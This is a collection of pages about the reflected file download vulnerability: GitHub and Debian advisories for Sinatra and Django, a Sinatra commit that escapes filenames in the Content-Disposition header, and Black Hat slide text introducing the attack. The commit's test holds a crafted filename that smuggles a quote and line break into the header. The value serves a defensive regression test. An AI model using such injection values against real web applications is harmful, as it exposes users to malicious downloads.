=== Content from github.com_8e24db6c_20250114_220354.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsinatra%2Fsinatra%2Fsecurity%2Fadvisories%2FGHSA-2x8x-jmrp-phxw)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsinatra%2Fsinatra%2Fsecurity%2Fadvisories%2FGHSA-2x8x-jmrp-phxw)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=sinatra%2Fsinatra)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sinatra](/sinatra)
/
**[sinatra](/sinatra/sinatra)**
Public

* [Notifications](/login?return_to=%2Fsinatra%2Fsinatra) You must be signed in to change notification settings
* [Fork
  2.1k](/login?return_to=%2Fsinatra%2Fsinatra)
* [Star
   12.2k](/login?return_to=%2Fsinatra%2Fsinatra)

* [Code](/sinatra/sinatra)
* [Issues
  19](/sinatra/sinatra/issues)
* [Pull requests
  4](/sinatra/sinatra/pulls)
* [Discussions](/sinatra/sinatra/discussions)
* [Actions](/sinatra/sinatra/actions)
* [Security](/sinatra/sinatra/security)
* [Insights](/sinatra/sinatra/pulse)

Additional navigation options

* [Code](/sinatra/sinatra)
* [Issues](/sinatra/sinatra/issues)
* [Pull requests](/sinatra/sinatra/pulls)
* [Discussions](/sinatra/sinatra/discussions)
* [Actions](/sinatra/sinatra/actions)
* [Security](/sinatra/sinatra/security)
* [Insights](/sinatra/sinatra/pulse)

# Sinatra vulnerable to Reflected File Download attack

High

[jkowens](/jkowens)
published
GHSA-2x8x-jmrp-phxw
Nov 26, 2022

## Package

bundler

sinatra
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

>= 3.0, < 3.0.4
< 2.2.3

## Patched versions

3.0.4
2.2.3

## Description

### Description

An issue was discovered in Sinatra 2.0 before 2.2.3 and 3.0 before 3.0.4. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a response when the filename is derived from user-supplied input.

### References

* <https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf>
* [GHSA-8x94-hmjh-97hq](https://github.com/advisories/GHSA-8x94-hmjh-97hq "GHSA-8x94-hmjh-97hq")

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2022-45442

### Weaknesses

No CWEs

### Credits

* [![@motoyasu-saburi](https://avatars.githubusercontent.com/u/18521568?s=40&v=4)](/motoyasu-saburi)
  [motoyasu-saburi](/motoyasu-saburi)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_da577823_20250114_220350.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-8x94-hmjh-97hq)

**CVE-2022-36359**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-8x94-hmjh-97hq)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2022-36359](/advisories/GHSA-8x94-hmjh-97hq)

## Django vulnerable to Reflected File Download attack

High severity

GitHub Reviewed

Published
Aug 11, 2022
to the GitHub Advisory Database
•
Updated Dec 18, 2024

[Vulnerability details](/advisories/GHSA-8x94-hmjh-97hq)
[Dependabot alerts
0](/advisories/GHSA-8x94-hmjh-97hq/dependabot)

## Package

pip

Django
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>= 4.0, < 4.0.7
< 3.2.15

## Patched versions

4.0.7
3.2.15

## Description

An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2022-36359>
* <https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml>
* <https://groups.google.com/g/django-announce/c/8cz--gvaJr4>
* <http://www.openwall.com/lists/oss-security/2022/08/03/1>
* <https://www.debian.org/security/2022/dsa-5254>
* [django/django@b3e4494](https://github.com/django/django/commit/b3e4494d759202a3b6bf247fd34455bf13be5b80)
* [django/django@b7d9529](https://github.com/django/django/commit/b7d9529cbe0af4adabb6ea5d01ed8dcce3668fb3)
* [django/django@bd06244](https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173)
* <https://docs.djangoproject.com/en/4.0/releases/security>
* [https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HWY6DQWRVBALV73BPUVBXC3QIYUM24IK](https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HWY6DQWRVBALV73BPUVBXC3QIYUM24IK)
* [https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LTZVAKU5ALQWOKFTPISE257VCVIYGFQI](https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LTZVAKU5ALQWOKFTPISE257VCVIYGFQI)
* <https://security.netapp.com/advisory/ntap-20220915-0008>
* <https://www.djangoproject.com/weblog/2022/aug/03/security-releases>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-36359)
Aug 3, 2022

Published to the GitHub Advisory Database
Aug 11, 2022

Reviewed
Aug 11, 2022

Last updated
Dec 18, 2024

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.455%
 (75th percentile)

### Weaknesses

[CWE-494](/advisories?query=cwe%3A494)

### CVE ID

CVE-2022-36359

### GHSA ID

GHSA-8x94-hmjh-97hq

### Source code

[django/django](https://github.com/django/django)

### Credits

* [![@sunSUNQ](https://avatars.githubusercontent.com/u/33311698?s=40&v=4)](/sunSUNQ)
  [sunSUNQ](/sunSUNQ)
  Analyst
* [![@levpachmanov](https://avatars.githubusercontent.com/u/31389480?s=40&v=4)](/levpachmanov)
  [levpachmanov](/levpachmanov)
  Analyst
* [![@G-Rath](https://avatars.githubusercontent.com/u/3151613?s=40&v=4)](/G-Rath)
  [G-Rath](/G-Rath)
  Analyst

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-8x94-hmjh-97hq/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.debian.org_1e949763_20250114_220354.html ===


---

[[Date Prev](msg00004.html)][[Date Next](msg00006.html)]
[[Thread Prev](msg00004.html)][[Thread Next](msg00006.html)]
[[Date Index](maillist.html#00005)]
[[Thread Index](threads.html#00005)]

# [SECURITY] [DLA 3264-1] ruby-sinatra security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3264-1] ruby-sinatra security update
* *From*: "Chris Lamb" <lamby@debian.org>
* *Date*: Tue, 10 Jan 2023 19:00:22 +0000
* *Message-id*: <[[🔎]](/msgid-search/167336515433.271685.5968231574823904852%40copycat) [167336515433.271685.5968231574823904852@copycat](msg00005.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-3264-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                           Chris Lamb
January 10, 2023                              <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : ruby-sinatra
Version        : 2.0.5-4+deb10u2
CVE ID         : CVE-2022-45442
Debian Bug     : 1025125

It was discovered that there was a potential reflected file download
(RFD) vulnerability in ruby-sinatra, a Ruby library for writing HTTP
applications. A Content-Disposition HTTP header was being incorrectly
derived from a potentially user-supplied filename.

For Debian 10 buster, this problem has been fixed in version
2.0.5-4+deb10u2.

We recommend that you upgrade your ruby-sinatra packages.

For the detailed security status of ruby-sinatra please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/ruby-sinatra>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEwv5L0nHBObhsUz5GHpU+J9QxHlgFAmO9hp8ACgkQHpU+J9Qx
HljTng//ap69CRstfigdy4BSIr1HDZvf1rPH8fpgGNVHfCsZvcgyXZAGBUlko6aw
Kld0A6kuAFfMzNsHlNF/BHoS7DNBn5Bq/pLiOPoyfxXaD+KN2X54A9qqQc++EnrM
2ZOdzExbqCpWqLnxU7ZTusjWMvBhjupiRLf1+VhPd2YSfcrYGD6jLLAsl6BqIaJ4
+Yy3G6PJmTUTO2upQI22MtWnh4VRWMbQrp9LZLg+1fBvOoFxxtkuGIH3jabJEN0F
HlgeHZk8NvmUvy5k3TyHmBVLrdohqShyzhl1LEo9ucz/k5xBbIS84X/WgdDgeq8f
woiyC8rV4ItQQTUsxaP74l6Q8I96ixm7N7ze02OW6Gluqd5ST2DBDJRB0K0BNK96
SLQ5Ma7Ebow9Dm11U8ik9uULzPzggSnFWUbjhIbpIAE7TraVqQGh33RCVTpjct5T
BXF7reoJQvDaN7X+Q8lZORktlprWGP8OGRn1ZAs9H0nwtlUeII/7HQLr9Ox6pjXG
s7AEazYfG3S3ATHTf5DWlCgEweVIuuZSo1J9FUNJSxOv6zHvBP8+nK5AVoYmT+/v
+uQjr2ZrHELFroNshO4G4grtcctqnwVBx5s+qZ0q44p6ZOgweeWG7mBr9AMisMEq
GAeuo0jAM5Wf2mgrA4w8V2fI/t2jo7OVKEUC462mMDKBzj0iLA4=
=JZ6o
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_89c0381f_20250114_220352.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsinatra%2Fsinatra%2Fcommit%2Fea8fc9495a350f7551b39e3025bfcd06f49f363b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsinatra%2Fsinatra%2Fcommit%2Fea8fc9495a350f7551b39e3025bfcd06f49f363b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=sinatra%2Fsinatra)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sinatra](/sinatra)
/
**[sinatra](/sinatra/sinatra)**
Public

* [Notifications](/login?return_to=%2Fsinatra%2Fsinatra) You must be signed in to change notification settings
* [Fork
  2.1k](/login?return_to=%2Fsinatra%2Fsinatra)
* [Star
   12.2k](/login?return_to=%2Fsinatra%2Fsinatra)

* [Code](/sinatra/sinatra)
* [Issues
  19](/sinatra/sinatra/issues)
* [Pull requests
  4](/sinatra/sinatra/pulls)
* [Discussions](/sinatra/sinatra/discussions)
* [Actions](/sinatra/sinatra/actions)
* [Security](/sinatra/sinatra/security)
* [Insights](/sinatra/sinatra/pulse)

Additional navigation options

* [Code](/sinatra/sinatra)
* [Issues](/sinatra/sinatra/issues)
* [Pull requests](/sinatra/sinatra/pulls)
* [Discussions](/sinatra/sinatra/discussions)
* [Actions](/sinatra/sinatra/actions)
* [Security](/sinatra/sinatra/security)
* [Insights](/sinatra/sinatra/pulse)

## Commit

[Permalink](/sinatra/sinatra/commit/ea8fc9495a350f7551b39e3025bfcd06f49f363b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

escape filename in the Content-Disposition header

[Browse files](/sinatra/sinatra/tree/ea8fc9495a350f7551b39e3025bfcd06f49f363b)
Browse the repository at this point in the history

```
According the multipart form data spec in WHATWG living standard.
Ref: <https://html.spec.whatwg.org/#multipart-form-data>
```

* Loading branch information

[![@namusyaka](https://avatars.githubusercontent.com/u/309329?s=40&v=4)](/namusyaka)

[namusyaka](/sinatra/sinatra/commits?author=namusyaka "View all commits by namusyaka")
committed
Nov 23, 2022

1 parent
[c90f203](/sinatra/sinatra/commit/c90f203f7a5cc4e5ef5c685e31d9d0bb002f8eab)

commit ea8fc94

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**20 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* lib/sinatra

  + lib/sinatra/base.rb
    [base.rb](#diff-d91dacd5fa5ae6f9bf2a5597340fdc531421266ba821aa7a5739b941e5677fa9)
* test

  + test/helpers\_test.rb
    [helpers\_test.rb](#diff-0d0a3e1d3bacf5e8b668eecdf3ee6dfeba73fc1404b1d35d6430656834f2637c)

## There are no files selected for viewing

9 changes: 8 additions & 1 deletion

9
[lib/sinatra/base.rb](#diff-d91dacd5fa5ae6f9bf2a5597340fdc531421266ba821aa7a5739b941e5677fa9 "lib/sinatra/base.rb")

Show comments

[View file](/sinatra/sinatra/blob/ea8fc9495a350f7551b39e3025bfcd06f49f363b/lib/sinatra/base.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -396,13 +396,20 @@ def content\_type(type = nil, params = {}) |
|  |  | response['Content-Type'] = mime\_type |
|  |  | end |
|  |  |  |
|  |  | # https://html.spec.whatwg.org/#multipart-form-data |
|  |  | MULTIPART\_FORM\_DATA\_REPLACEMENT\_TABLE = { |
|  |  | '"' => '%22', |
|  |  | "\r" => '%0D', |
|  |  | "\n" => '%0A' |
|  |  | }.freeze |
|  |  |  |
|  |  | # Set the Content-Disposition to "attachment" with the specified filename, |
|  |  | # instructing the user agents to prompt to save. |
|  |  | def attachment(filename = nil, disposition = :attachment) |
|  |  | response['Content-Disposition'] = disposition.to\_s.dup |
|  |  | return unless filename |
|  |  |  |
|  |  | params = format('; filename="%s"', File.basename(filename)) |
|  |  | params = format('; filename="%s"', File.basename(filename).gsub(/["\r\n]/, MULTIPART\_FORM\_DATA\_REPLACEMENT\_TABLE)) |
|  |  | response['Content-Disposition'] << params |
|  |  | ext = File.extname(filename) |
|  |  | content\_type(ext) unless response['Content-Type'] || ext.empty? |
| Expand Down | |  |

12 changes: 12 additions & 0 deletions

12
[test/helpers\_test.rb](#diff-0d0a3e1d3bacf5e8b668eecdf3ee6dfeba73fc1404b1d35d6430656834f2637c "test/helpers_test.rb")

Show comments

[View file](/sinatra/sinatra/blob/ea8fc9495a350f7551b39e3025bfcd06f49f363b/test/helpers_test.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -781,6 +781,18 @@ def attachment\_app(filename=nil) |
|  |  | assert\_equal '<sinatra></sinatra>', body |
|  |  | end |
|  |  |  |
|  |  | it 'escapes filename in the Content-Disposition header according to the multipart form data spec in WHATWG living standard' do |
|  |  | mock\_app do |
|  |  | get('/attachment') do |
|  |  | attachment "test.xml\";\r\next=.txt" |
|  |  | response.write("<sinatra></sinatra>") |
|  |  | end |
|  |  | end |
|  |  |  |
|  |  | get '/attachment' |
|  |  | assert\_equal 'attachment; filename="test.xml%22;%0D%0Aext=.txt"', response['Content-Disposition'] |
|  |  | assert\_equal '<sinatra></sinatra>', body |
|  |  | end |
|  |  | end |
|  |  |  |
|  |  | describe 'send\_file' do |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `ea8fc94`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsinatra%2Fsinatra%2Fcommit%2Fea8fc9495a350f7551b39e3025bfcd06f49f363b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.blackhat.com_37bd4b44_20250114_220437.html ===
Reflected File Download
A New Web Attack Vector

Oren Hafif
Security Researcher
Trustwave Spiderlabs

Download executable files
from
Google.com & Bing.com

File executes, No warnings
and
Gains control over the Machine

Reflected File Download

RFD is a web attack vector
that enables
attackers to gain complete control over a victims
machine by virtually downloading a file from a
trusted domain.

Get your hands on that whitepaper!

@orenhafif
@spiderlabs
blog.spiderlabs.com

2 ½ Months Ago…

Security Professionals

http://thechive.com/2009/02/14/these-
people-exist-part-3-25-photos/

Two Major Conferences

E v e r y   s u m m e r   i n   Ve g a s

Black Hat

Competing
Conference
Name

Security Professionals

Wow!

That’s Me!

It is
scary!

Reflected File Download
uses the dark side of the
force!

http://thechive.com/2009/02/14/these-
people-exist-part-3-25-photos/

There is nothing more joyful for a security professional…

…than being told that you are RIGHT
by other security professionals!

Reflected File Download
A New Web Attack Vector

Oren Hafif
Security Researcher
Trustwave Spiderlabs

Agenda

• Objectives
• Understand RFD

– What?
– Why?
– How?

• Advanced Exploitation

Agenda - What is RFD?

• DEMO!
• Analysis of the demo

Agenda – Why RFD?

• Motivation
• RFD exploitation capabilities and implications
• Trust Model for web downloads

Agenda – How RFD?

• How to Detect?
• How to Exploit?
• How to Prevent?

[   ] #78 – add cat pictures to slides

About Myself…

> Age.round(28)=30
> Age.round(27)=25

About Myself…

About Myself…

OBJECTIVES

BREAKERS

DETECT
AND
REPORT
RFD ISSUES

DEFENDERS

PREVENT
AND BLOCK
RFD
ATTACKS

BUILDERS

DEVELOP
SECURE
APIS and
WEB APPS

Windows Calculator

DEMO

Demo: Let’s talk about it…

• User clicked on a valid link to Google.com
• A malicious file got downloaded from Google.com
• The file executes immediately, once clicked.
• Windows calculator popped up (Pwned)!

No upload takes place…

A file is being downloaded…

Uploadless Downloads!

RFD Implications (Why?)
• Gain full control over the user’s machine
• Confidentiality – steal everything, install trojans
• Availability – delete everything, use cryptolockers
• Integrity – impersonate the user/website.

• Chrome: Get back into the Browser with Super Powers.

HOW DO WE TRUST DOWNLOADS?

